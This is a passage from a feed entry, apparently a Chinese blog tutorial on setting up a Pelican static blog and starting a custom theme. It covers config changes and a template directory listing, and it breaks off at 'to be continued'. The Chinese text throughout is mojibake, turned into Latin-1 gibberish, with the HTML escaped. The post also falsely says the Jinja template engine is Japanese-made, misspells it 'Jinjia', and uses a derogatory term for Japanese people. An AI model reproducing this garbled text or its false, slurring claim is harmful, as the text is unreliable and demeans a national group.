&lt;li&gt;å¯¹äºPython3é»˜è®¤çš„é…ç½®å¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œéœ€è¦å°†develop_server.shå°†&lt;code&gt;PY=${PY:-python2}&lt;/code&gt;æ”¹ä¸ºpython3ï¼Œmakefileä¸­å¦‚æœæœ‰é—®é¢˜ä¹Ÿéœ€è¦ä¿®æ”¹ã€‚&lt;/li&gt;
&lt;li&gt;å¯ä»¥å°†pelicanconf.pyä¸­çš„SITEURLæ”¹æˆ&lt;code&gt;http://localhost:8000&lt;/code&gt;ï¼Œå°†publishconf.pyä¸­çš„SITEURLæ”¹ä¸º&lt;code&gt;http://username.github.io&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;ä¸»é¢˜åˆ¶ä½œ&lt;/h1&gt;
&lt;p&gt;åˆ°è¿™å„¿ï¼Œä½ åº”è¯¥å·²ç»èƒ½é¡ºåˆ©æ­å»ºèµ·ä¸€ä¸ªåŸºäºPelicançš„Blogå¹¶åœ¨Githubä¸Šå‘å¸ƒäº†ã€‚ä¸‹é¢æˆ‘ä»¬æ¢è®¨ä¸€ä¸‹Pelicanä¸‹çš„ä¸ªæ€§åŒ–ä¸»é¢˜åˆ¶ä½œã€‚ä¸»é¢˜åˆ¶ä½œçš„å®˜æ–¹æ–‡æ¡£&lt;a href="http://docs.getpelican.com/en/3.4.0/themes.html"&gt;åœ¨æ­¤&lt;/a&gt;ï¼Œè¯·ä¸æ–­æŸ¥é˜…ä¸å‚è€ƒã€‚å¦å¤–ï¼ŒPelicanå®˜æ–¹çš„Githubä¸Šä¹Ÿæœ‰åˆ«äººåˆ¶ä½œå¥½çš„ä¸»é¢˜ï¼Œä½ å¯ä»¥&lt;a href="https://github.com/getpelican/pelican-themes"&gt;ç‚¹è¿™å„¿&lt;/a&gt;è¿›å»å‚è€ƒæˆ–è€…ä¸‹è½½ã€‚&lt;/p&gt;
&lt;h2&gt;åˆ¶ä½œæ€è·¯åŠç»„ä»¶&lt;/h2&gt;
&lt;p&gt;Pelicançš„ä¸»é¢˜åˆ¶ä½œåŸºäº&lt;a href="http://jinja.pocoo.org/"&gt;Jinjiaæ¨¡æ¿å¼•æ“&lt;/a&gt;ï¼Œçœ‹è¿™ä¸ªåå­—å’ŒLogoå°±çŸ¥é“æ˜¯å°æ—¥æœ¬çš„ä½œå“äº†ï¼Œå¦‚æœä½ æ›¾ç»ç”¨è¿‡smartyï¼ˆNå¹´ä»¥å‰äº†ï¼‰æˆ–è€…æ˜¯ç±»ä¼¼çš„æ¨¡æ¿å¼•æ“ï¼ŒåŸºæœ¬èƒ½ç§’é€Ÿä¸Šæ‰‹ã€‚åˆ©ç”¨æ¨¡æ¿å¼•æ“çš„ä¼˜åŠ¿å°±æ˜¯è§†å›¾å’Œæ•°æ®çš„åˆ†ç¦»ï¼Œæ•´ä¸ªè¿‡ç¨‹ç›¸å½“äºä½ å†™çš„.mdæ–‡ä»¶å°±æ˜¯æ•°æ®ï¼Œé€šè¿‡Pelicané©±åŠ¨ä¹‹åæŒ‰ç…§Jinjiaä½œä¸ºæ¨¡æ¿å¡«å……æ•°æ®ï¼Œå¹¶è¾“å‡ºæœ€ç»ˆhtmlã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºä¸»é¢˜åˆ¶ä½œï¼Œæ— éå°±æ˜¯å‰ç«¯çš„ä¸€äº›ä¸œè¥¿ï¼Œä»€ä¹ˆhtmlå•Šjså•Šä¹‹ç±»çš„ä¸œè¥¿ï¼Œæˆ‘è¿™è¾¹é‡‡ç”¨bootstrap3åŠ ä¸Šä¸€å †æ’ä»¶çš„æ–¹æ³•åˆ›å»ºhtmlï¼Œä¹‹åæ”¹å†™æˆJinjiaæ¨¡æ¿ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ä¸»é¢˜åˆ¶ä½œï¼ŒåŸºæœ¬å¯ä»¥ææ˜ç™½å¤§éƒ¨åˆ†Pelicané…ç½®çš„å«ä¹‰ã€‚å¦å¤–ï¼Œç”±äºè¿™å—å†…å®¹æœ¬èº«è¦†ç›–çŸ¥è¯†é¢å¾ˆå¹¿ï¼Œè¿™é‡Œåªèƒ½æŒ‰ç…§Pelicanä¸­ç‰¹æœ‰çš„ä¸€äº›è§„å®šå±•å¼€ï¼Œå‘¨è¾¹çš„å‰ç«¯çŸ¥è¯†åªèƒ½è¯´åˆ°ä¸€äº›å¿…è¦çš„ï¼Œå…¶ä»–æ–¹é¢è¿˜è¯·è¯»è€…è‡ªè¡Œè¡¥å……ã€‚&lt;/p&gt;
&lt;h2&gt;ä¸»é¢˜ç»“æ„&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆåˆ›å»ºä¸»é¢˜ç›®å½•ï¼Œæˆ‘å‡†å¤‡æ”¾åœ¨yourproject/themeç›®å½•ä¸‹ï¼Œæ­¤æ—¶æ‰“å¼€&lt;code&gt;pelicanconf.py&lt;/code&gt;ï¼Œæ·»åŠ å¦‚ä¸‹å­—æ®µï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;THEME = "theme"             #ä¸»é¢˜ç›®å½•
THEME_STATIC_DIR = 'theme'  #ç”Ÿæˆåçš„ä¸»é¢˜ç›®å½•
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰‹å†Œä¸Šç»™å‡ºå¦‚ä¸‹ä¸»é¢˜ç»“æ„ï¼Œè¿™å†™æ–‡ä»¶å¯ä»¥æ”¾åœ¨yourproject/themeç›®å½•ä¸‹ï¼ˆå…·ä½“å“ªå„¿éƒ½å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶æŒ‡å®šï¼‰ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;â”œâ”€â”€ static
â”‚   â”œâ”€â”€ css
â”‚   â””â”€â”€ images
â””â”€â”€ templates
    â”œâ”€â”€ archives.html         // æ–‡ç« å½’æ¡£
    â”œâ”€â”€ period_archives.html  // æŒ‰ç…§æ—¶é—´æ’åºçš„å½’æ¡£
    â”œâ”€â”€ article.html          // æ¯ç¯‡æ–‡ç« 
    â”œâ”€â”€ author.html           // æ¯ä¸ªä½œè€…
    â”œâ”€â”€ authors.html          // æ‰€æœ‰ä½œè€…
    â”œâ”€â”€ categories.html       // æ‰€æœ‰åˆ†ç±»
    â”œâ”€â”€ category.html         // æ¯ä¸ªåˆ†ç±»
    â”œâ”€â”€ index.html            // ä¸»é¡µ
    â”œâ”€â”€ page.html             // pageç•Œé¢ï¼ˆè‡ªå®šä¹‰çš„ç•Œé¢ï¼‰
    â”œâ”€â”€ tag.html              // æ¯ä¸ªä¸åŒtagçš„ç•Œé¢
    â””â”€â”€ tags.html             // æ€»tagç•Œé¢ï¼Œå¯ä»¥åˆ›å»ºtagäº‘
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çœ‹åˆ°ä¸Šé¢çš„ç›®å½•æ„é€ å¯ä»¥åŸºæœ¬æ˜ç™½å„ä¸ªæ–‡ä»¶çš„ä½œç”¨äº†ã€‚staticä¸­çš„æ–‡ä»¶ä¼šè¢«å®Œæ•´å¤åˆ¶åˆ°ç”Ÿæˆç›®å½•ä¸­ï¼Œè€Œtemplatesä¸­çš„æ–‡ä»¶åˆ™ä¼šé€šè¿‡Pelicanå¤„ç†ã€‚&lt;/p&gt;
&lt;p&gt;éœ€è¦ç‰¹åˆ«è¯´æ˜çš„æ˜¯ï¼Œä¸æ˜¯æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯å¿…é¡»çš„ï¼Œæ¯”å¦‚æˆ‘çš„Blogå°±æˆ‘ä¸€ä¸ªäººå†™æ–‡ç« ï¼Œåªæœ‰ä¸€ä¸ªä½œè€…ï¼Œæ‰€ä»¥authorå’Œauthorsæˆ‘å°±ä¸ç”¨ï¼Œä½ å¯ä»¥ä¿ç•™æ–‡ä»¶ï¼Œä¹‹åæŠŠé‡Œé¢å†…å®¹åˆ é™¤å³å¯ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥åˆ›å»ºæ–‡ä»¶ï¼Œé‡‡ç”¨Jinjiaçš„åŒ…å«è¯­å¥åŒ…å«åˆ°å…¶ä»–ç•Œé¢ä¸­ï¼Œè¿™åœ¨åé¢ä¼šè¯´æ˜ã€‚&lt;/p&gt;
&lt;h2&gt;ä¸»é¢˜å’Œé…ç½®&lt;/h2&gt;
&lt;p&gt;å¾…ç»­â€¦â€¦&lt;/p&gt;</summary><category term="github"></category><category term="pelican"></category><category term="bootstrap"></category></entry></feed>